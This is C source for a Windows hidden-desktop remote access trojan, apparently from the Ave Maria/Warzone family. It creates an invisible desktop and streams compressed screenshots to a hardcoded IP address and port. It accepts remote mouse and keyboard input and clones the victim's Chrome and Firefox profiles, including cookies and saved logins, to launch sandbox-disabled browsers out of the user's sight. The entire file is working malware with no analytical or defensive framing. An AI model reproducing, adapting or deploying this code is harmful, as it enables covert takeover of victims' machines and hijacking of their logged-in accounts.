#include <Shlobj.h>
#include <Shlwapi.h>
#include <Windows.h>
#include <Windowsx.h>
#include "Api.h"

#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable : 4996)

#define SAFE_BYTES 64

void *_alloc(SIZE_T size)
{
	return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + SAFE_BYTES);
}

void _free(void *mem)
{
	if (mem) HeapFree(GetProcessHeap(), 0, mem);
}

void _copy(void *dst, const void *src, SIZE_T size)
{
	for (SIZE_T i = 0; i < size; ++i) ((LPBYTE)dst)[i] = ((LPBYTE)src)[i];
}

void _set(void *mem, char c, SIZE_T size)
{
	for (SIZE_T i = 0; i < size; ++i)
	{
		((LPBYTE)mem)[i] = c;
		if (!i) i = 0; // prevents changing this function to memset
	}
}

void _zero(void *mem, SIZE_T size)
{
	_set(mem, 0, size);
}

int _cmp(const void *m1, const void *m2, SIZE_T size)
{
	BYTE *BM1 = (BYTE*)m1;
	BYTE *BM2 = (BYTE*)m2;
	for (; size--; ++BM1, ++BM2) if (*BM1 != *BM2) return (*BM1 - *BM2);
	return NULL;
}

ULONG PseudoRand(ULONG *seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}

#define BOT_ID_LEN 35
void GetBotId(char *botId)
{
	CHAR windowsDirectory[MAX_PATH];
	CHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (!GetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
		windowsDirectory[0] = L'C';

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = ':';
	volumeName[2] = '\\';
	volumeName[3] = '\0';

	GetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);

	wsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
}

void CopyDir(char *from, char *to)
{
	char fromWildCard[MAX_PATH] = { 0 };
	lstrcpyA(fromWildCard, from);
	lstrcatA(fromWildCard, "\\*");

	if (!CreateDirectoryA(to, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return;
	WIN32_FIND_DATAA findData;
	HANDLE hFindFile = FindFirstFileA(fromWildCard, &findData);
	if (hFindFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		char currFileFrom[MAX_PATH] = { 0 };
		lstrcpyA(currFileFrom, from);
		lstrcatA(currFileFrom, "\\");
		lstrcatA(currFileFrom, findData.cFileName);

		char currFileTo[MAX_PATH] = { 0 };
		lstrcpyA(currFileTo, to);
		lstrcatA(currFileTo, "\\");
		lstrcatA(currFileTo, findData.cFileName);

		if
			(
				findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				lstrcmpA(findData.cFileName, ".") &&
				lstrcmpA(findData.cFileName, "..")
				)
		{
			if (CreateDirectoryA(currFileTo, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
				CopyDir(currFileFrom, currFileTo);
		}
		else
			CopyFileA(currFileFrom, currFileTo, FALSE);
	} while (FindNextFileA(hFindFile, &findData));
}

enum connection { desktop, input };
enum Input { mouse };

static const BYTE     gc_magik[] = { 'A', 'V', 'E', '_', 'M', 'A', 'R', 'I', 'A', 0 };
static const COLORREF gc_trans = RGB(255, 174, 201);

enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startFirefox, startIexplore };

static int        g_port;
static char       g_host[MAX_PATH];
static BOOL       g_started = FALSE;
static BYTE      *g_pixels = NULL;
static BYTE      *g_oldPixels = NULL;
static BYTE      *g_tempPixels = NULL;
static HDESK      g_hDesk;
static BITMAPINFO g_bmpInfo;
static HANDLE     g_hInputThread, g_hDesktopThread;
static char       g_desktopName[MAX_PATH];

static BOOL PaintWindow(HWND hWnd, HDC hDc, HDC hDcScreen)
{
	BOOL ret = FALSE;
	RECT rect;
	GetWindowRect(hWnd, &rect);

	HDC     hDcWindow = CreateCompatibleDC(hDc);
	HBITMAP hBmpWindow = CreateCompatibleBitmap(hDc, rect.right - rect.left, rect.bottom - rect.top);

	SelectObject(hDcWindow, hBmpWindow);
	if (PrintWindow(hWnd, hDcWindow, 0))
	{
		BitBlt(hDcScreen,
			rect.left,
			rect.top,
			rect.right - rect.left,
			rect.bottom - rect.top,
			hDcWindow,
			0,
			0,
			SRCCOPY);

		ret = TRUE;
	}
	DeleteObject(hBmpWindow);
	DeleteDC(hDcWindow);
	return ret;
}

static void EnumWindowsTopToDown(HWND owner, WNDENUMPROC proc, LPARAM param)
{
	HWND currentWindow = GetTopWindow(owner);
	if (currentWindow == NULL)
		return;
	if ((currentWindow = GetWindow(currentWindow, GW_HWNDLAST)) == NULL)
		return;
	while (proc(currentWindow, param) && (currentWindow = GetWindow(currentWindow, GW_HWNDPREV)) != NULL);
}

struct EnumHwndsPrintData
{
	HDC hDc;
	HDC hDcScreen;
};

static BOOL CALLBACK EnumHwndsPrint(HWND hWnd, LPARAM lParam)
{
	EnumHwndsPrintData *data = (EnumHwndsPrintData *)lParam;

	if (!IsWindowVisible(hWnd))
		return TRUE;

	PaintWindow(hWnd, data->hDc, data->hDcScreen);

	DWORD style = GetWindowLongA(hWnd, GWL_EXSTYLE);
	SetWindowLongA(hWnd, GWL_EXSTYLE, style | WS_EX_COMPOSITED);

	OSVERSIONINFOA versionInfo;
	versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
	GetVersionExA(&versionInfo);
	if (versionInfo.dwMajorVersion < 6)
		EnumWindowsTopToDown(hWnd, EnumHwndsPrint, (LPARAM)data);
	return TRUE;
}

static BOOL GetDeskPixels(int serverWidth, int serverHeight)
{
	RECT rect;
	HWND hWndDesktop = GetDesktopWindow();
	GetWindowRect(hWndDesktop, &rect);

	HDC     hDc = GetDC(NULL);
	HDC     hDcScreen = CreateCompatibleDC(hDc);
	HBITMAP hBmpScreen = CreateCompatibleBitmap(hDc, rect.right, rect.bottom);
	SelectObject(hDcScreen, hBmpScreen);

	EnumHwndsPrintData data;
	data.hDc = hDc;
	data.hDcScreen = hDcScreen;

	EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&data);

	if (serverWidth > rect.right)
		serverWidth = rect.right;
	if (serverHeight > rect.bottom)
		serverHeight = rect.bottom;

	if (serverWidth != rect.right || serverHeight != rect.bottom)
	{
		HBITMAP hBmpScreenResized = CreateCompatibleBitmap(hDc, serverWidth, serverHeight);
		HDC     hDcScreenResized = CreateCompatibleDC(hDc);

		SelectObject(hDcScreenResized, hBmpScreenResized);
		SetStretchBltMode(hDcScreenResized, HALFTONE);
		StretchBlt(hDcScreenResized, 0, 0, serverWidth, serverHeight,
			hDcScreen, 0, 0, rect.right, rect.bottom, SRCCOPY);

		DeleteObject(hBmpScreen);
		DeleteDC(hDcScreen);

		hBmpScreen = hBmpScreenResized;
		hDcScreen = hDcScreenResized;
	}

	BOOL comparePixels = TRUE;
	g_bmpInfo.bmiHeader.biSizeImage = serverWidth * 3 * serverHeight;

	if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != serverWidth || g_bmpInfo.bmiHeader.biHeight != serverHeight))
	{
		free((HLOCAL)g_pixels);
		free((HLOCAL)g_oldPixels);
		free((HLOCAL)g_tempPixels);

		g_pixels = (BYTE *)_alloc(g_bmpInfo.bmiHeader.biSizeImage);
		g_oldPixels = (BYTE *)_alloc(g_bmpInfo.bmiHeader.biSizeImage);
		g_tempPixels = (BYTE *)_alloc(g_bmpInfo.bmiHeader.biSizeImage);

		comparePixels = FALSE;
	}

	g_bmpInfo.bmiHeader.biWidth = serverWidth;
	g_bmpInfo.bmiHeader.biHeight = serverHeight;
	GetDIBits(hDcScreen, hBmpScreen, 0, serverHeight, g_pixels, &g_bmpInfo, DIB_RGB_COLORS);

	DeleteObject(hBmpScreen);
	ReleaseDC(NULL, hDc);
	DeleteDC(hDcScreen);

	if (comparePixels)
	{
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3)
		{
			if (g_pixels[i] == GetRValue(gc_trans) &&
				g_pixels[i + 1] == GetGValue(gc_trans) &&
				g_pixels[i + 2] == GetBValue(gc_trans))
			{
				++g_pixels[i + 1];
			}
		}

		_copy(g_tempPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage); //TODO: CRT call

		BOOL same = TRUE;
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage - 1; i += 3)
		{
			if (g_pixels[i] == g_oldPixels[i] &&
				g_pixels[i + 1] == g_oldPixels[i + 1] &&
				g_pixels[i + 2] == g_oldPixels[i + 2])
			{
				g_pixels[i] = GetRValue(gc_trans);
				g_pixels[i + 1] = GetGValue(gc_trans);
				g_pixels[i + 2] = GetBValue(gc_trans);
			}
			else
				same = FALSE;
		}
		if (same)
			return TRUE;

		_copy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage); //TODO: CRT call
	}
	else
		_copy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
	return FALSE;
}

static SOCKET connectServer()
{
	WSADATA     wsa;
	SOCKET      s;
	SOCKADDR_IN addr;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return NULL;
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return NULL;

	hostent *he = gethostbyname(g_host);
	_copy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(g_port);

	if (connect(s, (sockaddr *)&addr, sizeof(addr)) < 0)
		return NULL;

	return s;
}

static int SendInt(SOCKET s, int i)
{
	return send(s, (char *)&i, sizeof(i), 0);
}

static DWORD WINAPI DesktopThread(LPVOID param)
{
	SOCKET s = connectServer();

	if (!SetThreadDesktop(g_hDesk))
		goto exit;

	if (send(s, (char *)gc_magik, sizeof(gc_magik), 0) <= 0)
		goto exit;
	if (SendInt(s, connection::desktop) <= 0)
		goto exit;

	for (;;)
	{
		int width, height;

		if (recv(s, (char *)&width, sizeof(width), 0) <= 0)
			goto exit;
		if (recv(s, (char *)&height, sizeof(height), 0) <= 0)
			goto exit;

		BOOL same = GetDeskPixels(width, height);
		if (same)
		{
			if (SendInt(s, 0) <= 0)
				goto exit;
			continue;
		}

		if (SendInt(s, 1) <= 0)
			goto exit;

		DWORD workSpaceSize;
		DWORD fragmentWorkSpaceSize;
		pRtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
		BYTE *workSpace = (BYTE *)_alloc(workSpaceSize);

		DWORD size;
		pRtlCompressBuffer(COMPRESSION_FORMAT_LZNT1,
			g_pixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			g_tempPixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			2048,
			&size,
			workSpace);

		free(workSpace);

		RECT rect;
		HWND hWndDesktop = GetDesktopWindow();
		GetWindowRect(hWndDesktop, &rect);
		if (SendInt(s, rect.right) <= 0)
			goto exit;
		if (SendInt(s, rect.bottom) <= 0)
			goto exit;
		if (SendInt(s, g_bmpInfo.bmiHeader.biWidth) <= 0)
			goto exit;
		if (SendInt(s, g_bmpInfo.bmiHeader.biHeight) <= 0)
			goto exit;
		if (SendInt(s, size) <= 0)
			goto exit;
		if (send(s, (char *)g_tempPixels, size, 0) <= 0)
			goto exit;

		DWORD response;
		if (recv(s, (char *)&response, sizeof(response), 0) <= 0)
			goto exit;
	}

exit:
	TerminateThread(g_hInputThread, 0);
	return 0;
}

static void StartChrome()
{
	char chromePath[MAX_PATH] = { 0 };
	SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
	lstrcatA(chromePath, "\\Google\\Chrome\\");

	char dataPath[MAX_PATH] = { 0 };
	lstrcpyA(dataPath, chromePath);
	lstrcatA(dataPath, "User Data\\");

	char botId[BOT_ID_LEN] = { 0 };
	char newDataPath[MAX_PATH] = { 0 };
	lstrcpyA(newDataPath, chromePath);
	GetBotId(botId);
	lstrcatA(newDataPath, botId);

	CopyDir(dataPath, newDataPath);

	char path[MAX_PATH] = { 0 };
	lstrcpyA(path, "cmd.exe /c start ");
	lstrcatA(path, "chrome.exe");
	lstrcatA(path, " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=");
	lstrcatA(path, "\"");
	lstrcatA(path, newDataPath);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartFirefox()
{
	char firefoxPath[MAX_PATH] = { 0 };
	SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, firefoxPath);
	lstrcatA(firefoxPath, "\\Mozilla\\Firefox\\");

	char profilesIniPath[MAX_PATH] = { 0 };
	lstrcpyA(profilesIniPath, firefoxPath);
	lstrcatA(profilesIniPath, "profiles.ini");

	HANDLE hProfilesIni = CreateFileA
	(
		profilesIniPath,
		FILE_READ_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hProfilesIni == INVALID_HANDLE_VALUE)
		return;

	DWORD profilesIniSize = GetFileSize(hProfilesIni, 0);
	DWORD read;
	char *profilesIniContent = (char *)_alloc(profilesIniSize + 1);
	ReadFile(hProfilesIni, profilesIniContent, profilesIniSize, &read, NULL);
	profilesIniContent[profilesIniSize] = 0;

	char *isRelativeRead = StrStrA(profilesIniContent, "IsRelative=");
	if (!isRelativeRead) {
		CloseHandle(hProfilesIni);
		free(profilesIniContent);
	}
	isRelativeRead += 11;
	BOOL isRelative = (*isRelativeRead == '1');

	char *path = StrStrA(profilesIniContent, "Path=");
	if (!path) {
		CloseHandle(hProfilesIni);
		free(profilesIniContent);
	}
	char *pathEnd = StrStrA(path, "\r");
	if (!pathEnd) {
		CloseHandle(hProfilesIni);
		free(profilesIniContent);
	}
	*pathEnd = 0;
	path += 5;

	char realPath[MAX_PATH] = { 0 };
	if (isRelative)
		lstrcpyA(realPath, firefoxPath);
	lstrcatA(realPath, path);

	char botId[BOT_ID_LEN];
	GetBotId(botId);

	char newPath[MAX_PATH];
	lstrcpyA(newPath, firefoxPath);
	lstrcatA(newPath, botId);

	CopyDir(realPath, newPath);

	char browserPath[MAX_PATH] = { 0 };
	lstrcpyA(browserPath, "cmd.exe /c start ");
	lstrcatA(browserPath, "firefox.exe");
	lstrcatA(browserPath, " -safe-mode -no-remote -profile ");
	lstrcatA(browserPath, "\"");
	lstrcatA(browserPath, newPath);
	lstrcatA(browserPath, "\"");

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	CreateProcessA(NULL, browserPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartIe()
{
	char path[MAX_PATH] = { 0 };
	lstrcpyA(path, "cmd.exe /c start ");
	lstrcatA(path, "iexplore.exe");

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static DWORD WINAPI InputThread(LPVOID param)
{
	SOCKET s = connectServer();

	SetThreadDesktop(g_hDesk);

	if (send(s, (char *)gc_magik, sizeof(gc_magik), 0) <= 0)
		return 0;
	if (SendInt(s, connection::input) <= 0)
		return 0;

	DWORD response;
	if (!recv(s, (char *)&response, sizeof(response), 0))
		return 0;

	g_hDesktopThread = CreateThread(NULL, 0, DesktopThread, NULL, 0, 0);

	POINT      lastPoint;
	BOOL       lmouseDown = FALSE;
	HWND       hResMoveWindow = NULL;
	LRESULT    resMoveType = NULL;

	lastPoint.x = 0;
	lastPoint.y = 0;

	for (;;)
	{
		UINT   msg;
		WPARAM wParam;
		LPARAM lParam;

		if (recv(s, (char *)&msg, sizeof(msg), 0) <= 0)
			goto exit;
		if (recv(s, (char *)&wParam, sizeof(wParam), 0) <= 0)
			goto exit;
		if (recv(s, (char *)&lParam, sizeof(lParam), 0) <= 0)
			goto exit;

		HWND  hWnd = 0;
		POINT point;
		POINT lastPointCopy;
		BOOL  mouseMsg = FALSE;

		switch (msg)
		{
		case WmStartApp::startExplorer:
		{
			const DWORD neverCombine = 2;
			const char *valueName = "TaskbarGlomLevel";

			HKEY hKey;
			RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_ALL_ACCESS, &hKey);
			DWORD value;
			DWORD size = sizeof(DWORD);
			DWORD type = REG_DWORD;
			RegQueryValueExA(hKey, valueName, 0, &type, (BYTE *)&value, &size);

			if (value != neverCombine)
				RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&neverCombine, size);

			char explorerPath[MAX_PATH] = { 0 };
			GetWindowsDirectoryA(explorerPath, MAX_PATH);
			lstrcatA(explorerPath, "\\");
			lstrcatA(explorerPath, "explorer.exe");

			STARTUPINFOA startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

			APPBARDATA appbarData;
			appbarData.cbSize = sizeof(appbarData);
			for (int i = 0; i < 5; ++i)
			{
				Sleep(1000);
				appbarData.hWnd = FindWindowA("Shell_TrayWnd", NULL);
				if (appbarData.hWnd)
					break;
			}

			appbarData.lParam = ABS_ALWAYSONTOP;
			SHAppBarMessage(ABM_SETSTATE, &appbarData);

			RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE *)&value, size);
			RegCloseKey(hKey);
			break;
		}
		case WmStartApp::startRun:
		{
			char rundllPath[MAX_PATH] = { 0 };
			SHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
			lstrcatA(rundllPath, "\\rundll32.exe shell32.dll,#61");

			STARTUPINFOA startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
			break;
		}
		case WmStartApp::startChrome:
		{
			StartChrome();
			break;
		}
		case WmStartApp::startFirefox:
		{
			StartFirefox();
			break;
		}
		case WmStartApp::startIexplore:
		{
			StartIe();
			break;
		}
		case WM_CHAR:
		case WM_KEYDOWN:
		case WM_KEYUP:
		{
			point = lastPoint;
			hWnd = WindowFromPoint(point);
			break;
		}
		default:
		{
			mouseMsg = TRUE;
			point.x = GET_X_LPARAM(lParam);
			point.y = GET_Y_LPARAM(lParam);
			lastPointCopy = lastPoint;
			lastPoint = point;

			hWnd = WindowFromPoint(point);
			if (msg == WM_LBUTTONUP)
			{
				lmouseDown = FALSE;
				LRESULT lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);

				switch (lResult)
				{
				case HTTRANSPARENT:
				{
					SetWindowLongA(hWnd, GWL_STYLE, GetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
					lResult = SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
					break;
				}
				case HTCLOSE:
				{
					PostMessageA(hWnd, WM_CLOSE, 0, 0);
					break;
				}
				case HTMINBUTTON:
				{
					PostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
					break;
				}
				case HTMAXBUTTON:
				{
					WINDOWPLACEMENT windowPlacement;
					windowPlacement.length = sizeof(windowPlacement);
					GetWindowPlacement(hWnd, &windowPlacement);
					if (windowPlacement.flags & SW_SHOWMAXIMIZED)
						PostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
					else
						PostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
					break;
				}
				}
			}
			else if (msg == WM_LBUTTONDOWN)
			{
				lmouseDown = TRUE;
				hResMoveWindow = NULL;

				RECT startButtonRect;
				HWND hStartButton = FindWindowA("Button", NULL);
				GetWindowRect(hStartButton, &startButtonRect);
				if (PtInRect(&startButtonRect, point))
				{
					PostMessageA(hStartButton, BM_CLICK, 0, 0);
					continue;
				}
				else
				{
					char windowClass[MAX_PATH] = { 0 };
					RealGetWindowClassA(hWnd, windowClass, MAX_PATH);

					if (!lstrcmpA(windowClass, "#32768"))
					{
						HMENU hMenu = (HMENU)SendMessageA(hWnd, MN_GETHMENU, 0, 0);
						int itemPos = MenuItemFromPoint(NULL, hMenu, point);
						int itemId = GetMenuItemID(hMenu, itemPos);
						PostMessageA(hWnd, 0x1e5, itemPos, 0);
						PostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
						continue;
					}
				}
			}
			else if (msg == WM_MOUSEMOVE)
			{
				if (!lmouseDown)
					continue;

				if (!hResMoveWindow)
					resMoveType = SendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
				else
					hWnd = hResMoveWindow;

				int moveX = lastPointCopy.x - point.x;
				int moveY = lastPointCopy.y - point.y;

				RECT rect;
				GetWindowRect(hWnd, &rect);

				int x = rect.left;
				int y = rect.top;
				int width = rect.right - rect.left;
				int height = rect.bottom - rect.top;
				switch (resMoveType)
				{
				case HTCAPTION:
				{
					x -= moveX;
					y -= moveY;
					break;
				}
				case HTTOP:
				{
					y -= moveY;
					height += moveY;
					break;
				}
				case HTBOTTOM:
				{
					height -= moveY;
					break;
				}
				case HTLEFT:
				{
					x -= moveX;
					width += moveX;
					break;
				}
				case HTRIGHT:
				{
					width -= moveX;
					break;
				}
				case HTTOPLEFT:
				{
					y -= moveY;
					height += moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTTOPRIGHT:
				{
					y -= moveY;
					height += moveY;
					width -= moveX;
					break;
				}
				case HTBOTTOMLEFT:
				{
					height -= moveY;
					x -= moveX;
					width += moveX;
					break;
				}
				case HTBOTTOMRIGHT:
				{
					height -= moveY;
					width -= moveX;
					break;
				}
				default:
					continue;
				}
				MoveWindow(hWnd, x, y, width, height, FALSE);
				hResMoveWindow = hWnd;
				continue;
			}
			break;
		}
		}

		for (HWND currHwnd = hWnd;;)
		{
			hWnd = currHwnd;
			ScreenToClient(currHwnd, &point);
			currHwnd = ChildWindowFromPoint(currHwnd, point);
			if (!currHwnd || currHwnd == hWnd)
				break;
		}

		if (mouseMsg)
			lParam = MAKELPARAM(point.x, point.y);

		PostMessageA(hWnd, msg, wParam, lParam);
	}
exit:
	TerminateThread(g_hDesktopThread, 0);
	return 0;
}

static DWORD WINAPI _startHRDP()
{
	memset(g_desktopName, 0, sizeof(g_desktopName));
	GetBotId(g_desktopName);

	memset(&g_bmpInfo, 0, sizeof(g_bmpInfo));
	g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
	g_bmpInfo.bmiHeader.biPlanes = 1;
	g_bmpInfo.bmiHeader.biBitCount = 24;
	g_bmpInfo.bmiHeader.biCompression = BI_RGB;
	g_bmpInfo.bmiHeader.biClrUsed = 0;

	g_hDesk = OpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
	if (!g_hDesk)
		g_hDesk = CreateDesktopA(g_desktopName, NULL, NULL, 0, GENERIC_ALL, NULL);
	SetThreadDesktop(g_hDesk);

	g_hInputThread = CreateThread(NULL, 0, InputThread, NULL, 0, 0);
	WaitForSingleObject(g_hInputThread, INFINITE);

	free(g_pixels);
	free(g_oldPixels);
	free(g_tempPixels);

	CloseHandle(g_hInputThread);
	CloseHandle(g_hDesktopThread);

	g_pixels = NULL;
	g_oldPixels = NULL;
	g_tempPixels = NULL;
	g_started = FALSE;
	return 0;
}

void StartHiddenDesktop(char *host, int port)
{
	if (g_started)
		return;
	lstrcpyA(g_host, host);
	g_port = port;
	g_started = TRUE;
	_startHRDP();
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	StartHiddenDesktop((char*)"178.159.42.207", 5656);
	return 0;
}